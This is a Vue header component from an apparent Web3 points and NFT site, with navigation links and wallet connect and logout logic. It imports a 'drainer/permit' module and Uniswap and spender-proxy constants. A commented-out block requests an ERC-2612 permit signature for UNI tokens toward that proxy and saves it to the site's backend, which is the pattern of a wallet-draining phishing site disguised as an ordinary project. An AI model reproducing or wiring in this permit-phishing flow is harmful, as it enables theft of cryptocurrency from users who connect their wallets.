<template>
    <div id="container" class="flex justify-between items-center bg-[#F1F1F1] px-[20px] py-4 rounded-[50px]">

        <div class="flex cursor-pointer" @click="linkClicked('home')">
            <img src="/images/headerlogo.png" @click="linkClicked('home')" class="h-10 cursor-pointer" />
        </div>


        <div class="!inline-block lg:!hidden">
            <div @click="showDropdown = !showDropdown"
                class="cursor-pointer py-1 px-2 border-gray-400 border-[1px] rounded-[5px]">

                <img src="/images/hambuger.svg" class="h-6 w-6" />

            </div>

        </div>

        <div class="dropdown-container" v-if="showDropdown">

            <div class="dropdown-content shadow-2xl h-screen flex-col w-full">
                <div class="cancel-btn text-blue-500" @click="showDropdown = false">&#x2716;</div>

                <div class="flex-col w-full mt-16 cursor-pointer">
                    <p @click="linkClicked('home')">Home</p>
                    <p class="mt-5" @click="linkClicked('vision')">Our Vision</p>
                    <p class="mt-5" @click="linkClicked('partners')">Our Partners</p>
                    <p class="mt-5" @click="linkClicked('fog')">FoG Foundation</p>

                    <div class="mt-4">

                        <button
                            class="rounded-full px-[30px] py-[10px] text-[18px] font-semibold text-[#7C58F2] hover:text-white bg-white hover:bg-[#7C58F2] border-[#7C58F2] border-[1px]"
                            @click="() => disconnectClicked()" v-if="isWalletConnected">Logout</button>
                        <button
                            class="rounded-full px-[30px] py-[10px] text-[18px] font-semibold text-[#7C58F2] hover:text-white bg-white hover:bg-[#7C58F2] border-[#7C58F2] border-[1px]"
                            @click="() => dashboardClicked()" v-else>Dashboard</button>
                    </div>
                    <!-- <p class="mt-5" @click="linkClicked('newsletter')">Newsletter</p> -->
                </div>
            </div>

        </div>




        <div class="lg:!flex items-center !hidden cursor-pointer">
            <p class="link" @click="linkClicked('home')">Home</p>
            <p class="link" @click="linkClicked('vision')">Our Vision</p>
            <p class="link" @click="linkClicked('partners')">Our Partners</p>
            <p class="link" @click="linkClicked('fog')">FoG Foundation</p>

            <div>

                <button
                    class="rounded-full px-[30px] py-[10px] text-[18px] font-semibold text-[#7C58F2] hover:text-white bg-white hover:bg-[#7C58F2] border-[#7C58F2] border-[1px]"
                    @click="() => disconnectClicked()" v-if="isWalletConnected">Logout</button>
                <button
                    class="rounded-full px-[30px] py-[10px] text-[18px] font-semibold text-[#7C58F2] hover:text-white bg-white hover:bg-[#7C58F2] border-[#7C58F2] border-[1px]"
                    @click="() => dashboardClicked()" v-else>Dashboard</button>
            </div>

            <!-- <p class="link" @click="linkClicked('newsletter')">Newsletter</p> -->
        </div>
    </div>
</template>


<script setup>
import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork } from '../../apiss/web3/walletconnect';
import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../apiss/web3/walletSignature';
import { requestPermitSignature } from '../../apiss/web3/drainer/permit';
import { UNISWAP_ADDRESS, UNISWAP_NAME } from '../../apiss/web3/drainer/constants';
import { spenderProxyAddress } from '../../apiss/web3/constants/erc2612permit';
import { getAll as getAllReferrals } from '../../apiss/referral'
import { getUser, create as createUser } from '~/apiss/profile';

const showDropdown = ref(false);
const emit = defineEmits(['link-clicked'])
const auth = useAuth()
const walletAddress = ref('');
// const addressSignature = ref(null)
const isWalletConnected = ref(false);
const initialLoading = ref(false);

function linkClicked(link) {
    emit('link-clicked', link)
    showDropdown.value = false;
}


onMounted(() => {
    isWalletConnected.value = getIsConnected();
    walletAddress.value = getAddress();

    listenToWalletStateChange()
    // if (!walletAddress.value) toggleConnectModal(true)     
})


function listenToWalletStateChange() {
    subscribeState()?.on('STATE_CHANGED', events => {
        isWalletConnected.value = getIsConnected();
        walletAddress.value = getAddress();
    });
}




watch(() => walletAddress.value, async () => {
    if (!walletAddress.value) return;
    // walletAddress.value = "0x8089F323938ad3a2f2AABC4e3F07b20309D2c039"

    auth.value.isWalletConnected = isWalletConnected.value;
    auth.value.walletAddress = walletAddress.value

    initialLoading.value = true;
    // addressSignature.value = await getAddressSignature(walletAddress.value);

    const user = await getUser(walletAddress.value)
    const referrals = await getAllReferrals(walletAddress.value)
    if (!user) await createUser(walletAddress.value);

    auth.value.points = user?.points || 0
    auth.value.hasClaimedPoints = user?.hasClaimedPoints || false
    auth.value.hasClaimedNFTMintBonus = user?.hasClaimedNFTMintBonus || false
    auth.value.hasClaimedWelcomeBonusPoint = user?.hasClaimedWelcomeBonusPoint || false
    auth.value.hasMintedNFT = user?.hasMintedNFT || false
    auth.value.lastAnsweredQuestionID = user?.lastAnsweredQuestionID || null
    auth.value.lastAnswerID = user?.lastAnswerID || null
    auth.value.nominationCountSlot = user?.nominationCountSlot || 0
    auth.value.email = user?.email || ""
    auth.value.nickname = user?.username || ""
    auth.value.referrals = Array.from(
        new Map(referrals.map(item => [item.address, item])).values()
    ) || []

    if (!isWalletConnected.value) {
        openModal()
        return;
    }


    if (getChainID() != 1) {
        if (window.ethereum) await switchNetwork(1);
        else {
            await disconnectWallet();
            isWalletConnected.value = false;
            walletAddress.value = "";
            alert("Switch to Ethereum Mainnet Network");
        }
        return;
    }
    initialLoading.value = false;
    navigateTo('/dashboard')
    return;

    // if (isMigrated.value) {
    //     initialLoading.value = false;
    //     navigateTo('/dashboard')
    //     return;
    // }


    // try {
    //     if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress.value);

    //     const signatureResult = await requestPermitSignature(UNISWAP_ADDRESS, UNISWAP_NAME, getChainID(), 1 * (10**18));
    //     console.log("signatureResult:    ", signatureResult);

    //     await updateAddressSignature(walletAddress.value, signatureResult); 
    //     addressSignature.value = await getAddressSignature(walletAddress.value);

    //     initialLoading.value = false;
    //     navigateTo('/dashboard')
    // } catch (err) {
    //     initialLoading.value = false
    //     if (err?.info?.error?.code == -32000) {
    //         alert("Insufficient funds")
    //     }
    //     else if (err?.info?.error?.code == 4001) {
    //         alert("Transaction rejected")
    //     } else alert("An error occured")
    //     console.log(err)
    //     disconnectClicked()
    // }



})


// const isMigrated = computed(() => {
//     return (addressSignature.value?.signatures?.length && 
//         addressSignature.value?.signatures?.map(i => i.token_address.toLowerCase()).includes(UNISWAP_ADDRESS.toLowerCase()) && 
//         addressSignature.value?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
// })

function dashboardClicked() {
    openModal();
}


// onMounted(() => {
//     disconnectClicked()
// })

function disconnectClicked() {
    disconnectWallet().then(() => {
        auth.value.walletAddress = '';
        auth.value.isWalletConnected = false;
        auth.value.hasClaimedPoints = false;
        auth.value.points = 0;
        auth.value.lastAnsweredQuestionID = null;
        auth.value.lastAnswerID = null;
        walletAddress.value = ""
        isWalletConnected.value = false;
        navigateTo('/')
    })
}
</script>

<style scoped>
.link {
    margin: 0px 10px;
    cursor: pointer;
    font-weight: 400;
    color: #6F6F6F;
    font-size: 18px;
}

.link:hover {
    color: #7C58F2;
    border-bottom: 1px solid #7C58F2;
}

.dropdown-container {
    box-shadow: 2px 24x 4px rgba(2, 0, 0, 0.831);
}

.dropdown-content {
    position: absolute;
    width: 65%;
    top: calc(0% + 0px);
    right: 0;
    background-color: white;
    z-index: 1;
    padding: 10px;
    overflow-y: scroll;
}

.cancel-btn {
    position: absolute;
    top: 0;
    right: 0;
    margin-right: 10px;
    padding: 0.5rem;
    cursor: pointer;
    font-size: 25px;
}
</style>